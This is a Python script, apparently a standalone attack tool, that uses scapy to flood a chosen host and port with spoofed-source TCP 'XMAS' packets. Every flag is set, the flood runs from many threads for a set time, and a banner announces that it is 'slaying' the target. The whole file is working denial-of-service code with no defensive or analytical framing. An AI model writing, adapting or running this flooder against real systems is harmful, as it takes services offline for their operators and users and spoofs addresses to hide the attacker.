import sys, socket, time, threading
import random, string
from scapy.all import *
from urllib.parse import urlparse

_abort = False

def _xmas(_ip):
    data = ''
    while _abort == False:
        try:
            _fake = ".".join(map(str, (random.randint(0,255)for _ in range(4))))
            template = IP(dst=_ip, src=_fake)/TCP()
            template[TCP].flags = "FSRPAUEC"
            xmas = []
            xmas.extend(template)
            xmas[0][TCP].dport=int(sys.argv[2])
            send(xmas, verbose=False)
        except KeyboardInterrupt:
            pass

def _rslv():
    _host = sys.argv[1].lower()
    if not (_host.startswith('http://') or _host.startswith('https://')):
        _host = "http://" + _host

    try:
        _domain = urlparse(_host).netloc
        _ip = socket.gethostbyname(_domain)
        return _domain, _ip
    except KeyboardInterrupt:
        sys.exit('\r\n DNS resolution failed!\r\n')
        
def main():
    global _abort
    if len(sys.argv) != 5:
        sys.exit('\r\n Usage: <target> <port> <time> <threading>\r\n')

    if not 'SUDO_UID' in os.environ:
        sys.exit("\r\n    Script requires root elevation!\r\n")
    
    _domain, _ip = _rslv()
    
    print("""\r\n\r\n\r\n\r\n\r\n\r\n
 ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
 ░░░░░░░░░░░░▀█░░░░░░▄▀▄░▄▀▄░▄▀▄░░░░░█▀█░█▀▀░█▀▀░█░░░▀█▀░█▀█░█▀▀░░░░░░░░░  
 ░░░░░░░░▄█▄░░█░░▄▄▄░▄▀▄░█░█░█░█░▄▄▄░█░█░█▀▀░█▀▀░█░░░░█░░█░█░█▀▀░░░░░░░░░  
 ░░░░░░░░░▀░░▀▀▀░░░░░░▀░░░▀░░░▀░░░░░░▀▀▀░▀░░░▀░░░▀▀▀░▀▀▀░▀░▀░▀▀▀░░░░░░░░░  
 ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
 ░▀█▀░█░█░█▀█░█▀█░█░█░█▀▀░░░█▀▀░█▀█░█▀▄░░░█▀█░█░░░█▀█░█░█░▀█▀░█▀█░█▀▀░█░░
 ░░█░░█▀█░█▀█░█░█░█▀▄░▀▀█░░░█▀▀░█░█░█▀▄░░░█▀▀░█░░░█▀█░░█░░░█░░█░█░█░█░▀░░
 ░░▀░░▀░▀░▀░▀░▀░▀░▀░▀░▀▀▀░░░▀░░░▀▀▀░▀░▀░░░▀░░░▀▀▀░▀░▀░░▀░░▀▀▀░▀░▀░▀▀▀░▀░░
 ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
""")
    print(" Merry Christmas! Slaying " + _ip + ":" + sys.argv[2] + " for " + sys.argv[3] + " seconds...\r\n")

    _thread = []
    #i = 0
    for i in range(0, int(sys.argv[4])):
        #i +=1
        x = threading.Thread(target=_xmas, args=(_ip,))
        _thread.append(x)
        x.start()
    
    _duration = time.time() + int(sys.argv[3])
    try:
        while time.time() < _duration:
            pass
    except KeyboardInterrupt:
        pass

    _abort = True
     
    for y in _thread:
        y.join()
         
    sys.exit("\r\n Done!\r\n")
    
if __name__ == "__main__":
    main()
  
